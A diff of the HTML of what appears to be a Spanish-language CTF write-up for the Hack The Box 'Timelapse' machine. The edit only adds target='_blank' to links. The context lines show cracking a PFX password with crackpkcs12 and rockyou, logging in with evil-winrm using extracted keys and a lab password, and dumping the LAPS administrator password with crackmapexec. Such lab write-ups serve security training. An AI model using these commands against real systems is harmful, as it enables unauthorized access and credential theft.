@@ -122,7 +122,7 @@ Archive:  winrm_backup.zip
 </code></pre></div><p>El archivo ZIP contiene un archivo PFX, que contiene un par de claves para conectarnos por WinRM al puerto 5986, no 5985 como normalmente. Esto es porque se está utilizando SSL y por ello necesitamos claves pública y privada para conectarnos.</p><p>Podemos extraer estas claves mediante <code>openssl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv-key.pem  
 Enter Import Password:
 Can't read Password
-</code></pre></div><p>Pero necesitamos otra contraseña porque <code>supremelegacy</code> no funciona.</p><p>Encontré una herramienta llamada <a href="https://sourceforge.net/projects/crackpkcs12/"><code>crackpkcs12</code></a> para realizar un ataque de fuerza bruta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./crackpkcs12</span> -d $WORDLISTS/rockyou.txt legacyy_dev_auth.pfx  
+</code></pre></div><p>Pero necesitamos otra contraseña porque <code>supremelegacy</code> no funciona.</p><p>Encontré una herramienta llamada <a target="_blank" href="https://sourceforge.net/projects/crackpkcs12/"><code>crackpkcs12</code></a> para realizar un ataque de fuerza bruta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./crackpkcs12</span> -d $WORDLISTS/rockyou.txt legacyy_dev_auth.pfx  
 
 Dictionary attack - Starting 1 threads
 
@@ -136,7 +136,7 @@ MAC verified OK
 <span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pub-key.pem
 Enter Import Password:
 MAC verified OK
-</code></pre></div><p>Y ahora podemos usar <a href="https://github.com/Hackplayers/evil-winrm"><code>evil-winrm</code></a> para conectarnos a la máquina (no hay necesidad de poner usuario/contraseña porque ya vienen en las claves):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 10.10.11.152 --ssl -k priv-key.pem -c pub-key.pem
+</code></pre></div><p>Y ahora podemos usar <a target="_blank" href="https://github.com/Hackplayers/evil-winrm"><code>evil-winrm</code></a> para conectarnos a la máquina (no hay necesidad de poner usuario/contraseña porque ya vienen en las claves):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 10.10.11.152 --ssl -k priv-key.pem -c pub-key.pem
 
 <span class="code-dark-blue">Evil-WinRM shell v3.3</span>
 
@@ -269,7 +269,7 @@ exit
 <span class="code-dark-red">*Evil-WinRM*</span> <span class="code-yellow">PS</span> C:\Users\legacyy\Documents&gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
 <span class="code-dark-red">*Evil-WinRM*</span> <span class="code-yellow">PS</span> C:\Users\legacyy\Documents&gt; Invoke-Command -ComputerName localhost -Credential $c -Port 5986 -usessl -SessionOption $so -ScriptBlock { whoami }  
 timelapse\svc_deploy
-</code></pre></div><p>E incluso nos podemos conectar por <a href="https://github.com/Hackplayers/evil-winrm"><code>evil-winrm</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 10.10.11.152 --ssl -u svc_deploy -p <span class="code-dark-yellow">'E3R$Q62^12p7PLlC%KWaxuaV'</span>  
+</code></pre></div><p>E incluso nos podemos conectar por <a target="_blank" href="https://github.com/Hackplayers/evil-winrm"><code>evil-winrm</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evil-winrm</span> -i 10.10.11.152 --ssl -u svc_deploy -p <span class="code-dark-yellow">'E3R$Q62^12p7PLlC%KWaxuaV'</span>  
 
 <span class="code-dark-blue">Evil-WinRM shell v3.3</span>
 
@@ -278,7 +278,7 @@ timelapse\svc_deploy
 <span class="code-dark-blue">Info: Establishing connection to remote endpoint</span>
 
 <span class="code-dark-red">*Evil-WinRM*</span> <span class="code-yellow">PS</span> C:\Users\svc_deploy\Documents&gt;
-</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Pero lo más importante es que podemos leer la contraseña configurada por LAPS mediante <a href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">crackmapexec</span> ldap 10.10.11.152 -u svc_deploy -p <span class="code-dark-yellow">'E3R$Q62^12p7PLlC%KWaxuaV'</span> -M laps
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Pero lo más importante es que podemos leer la contraseña configurada por LAPS mediante <a target="_blank" href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">crackmapexec</span> ldap 10.10.11.152 -u svc_deploy -p <span class="code-dark-yellow">'E3R$Q62^12p7PLlC%KWaxuaV'</span> -M laps
 <span class="code-blue">LDAP</span>        10.10.11.152    389    DC01             <span class="code-blue">[*]</span> Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)  
 <span class="code-blue">LDAP</span>        10.10.11.152    389    DC01             <span class="code-green">[+]</span> timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
 <span class="code-cyan">LAPS</span>        10.10.11.152    389    DC01             <span class="code-blue">[*]</span> Getting LAPS Passwords
